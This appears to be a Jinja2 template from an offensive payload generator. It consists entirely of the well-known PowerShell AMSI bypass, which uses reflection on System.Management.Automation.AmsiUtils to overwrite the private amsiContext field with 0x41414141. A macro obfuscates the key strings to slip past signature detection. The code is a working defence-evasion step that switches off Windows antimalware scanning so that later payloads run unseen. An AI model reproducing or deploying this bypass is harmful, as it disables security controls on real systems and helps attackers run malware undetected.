{% from 'macros.jinja2' import obfuscate with context%}

[Runtime.InteropServices.Marshal]::WriteInt32([Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}.Invoke({{obfuscate("System.Management.Automation.AmsiUtils")}}).GetField({{obfuscate("amsiContext")}},[Reflection.BindingFlags]{{obfuscate("NonPublic,Static")}}).{{obfuscate("GetValue")}}.Invoke($null),0x41414141);
